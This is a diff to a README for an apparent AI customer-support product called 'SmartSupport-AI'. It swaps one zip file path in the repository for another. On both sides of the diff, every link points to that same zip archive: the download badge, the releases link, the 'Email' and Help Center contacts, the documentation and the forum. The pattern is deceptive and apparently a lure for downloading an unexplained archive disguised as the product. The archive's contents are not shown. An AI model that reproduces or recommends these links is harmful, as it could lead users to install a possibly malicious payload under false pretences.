@@ -1,6 +1,6 @@
 # 🤖 SmartSupport-AI - Your Automated Customer Support Solution
 
-[![Download SmartSupport-AI](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip%20Now-Get%20the%https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)
+[![Download SmartSupport-AI](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip%20Now-Get%20the%https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading SmartSupport-AI, ensure your system meets these basic require
 ## 📥 Download & Install
 
 To download SmartSupport-AI, visit this page to download:
-[SmartSupport-AI Releases](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)
+[SmartSupport-AI Releases](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)
 
 1. Click the link above.
 2. Find the latest release version.
@@ -78,13 +78,13 @@ If you encounter issues while using SmartSupport-AI, try the following:
 
 For further assistance, please reach out to our support team:
 
-- **Email:** https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip
-- **Help Center:** Visit our [Help Center](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip) for FAQs and guides.
+- **Email:** https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip
+- **Help Center:** Visit our [Help Center](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip) for FAQs and guides.
 
 ## 🔗 Useful Links
 
-- [SmartSupport-AI Releases](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)
-- [Documentation](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)
-- [Community Forum](https://raw.githubusercontent.com/SeanGenry/SmartSupport-AI/main/backend/Smart-AI-Support-2.5.zip)
+- [SmartSupport-AI Releases](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)
+- [Documentation](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)
+- [Community Forum](https://github.com/SeanGenry/SmartSupport-AI/raw/refs/heads/main/frontend/Support_AI_Smart_v2.7.zip)
 
 Thank you for choosing SmartSupport-AI! We hope it enhances your customer support experience.
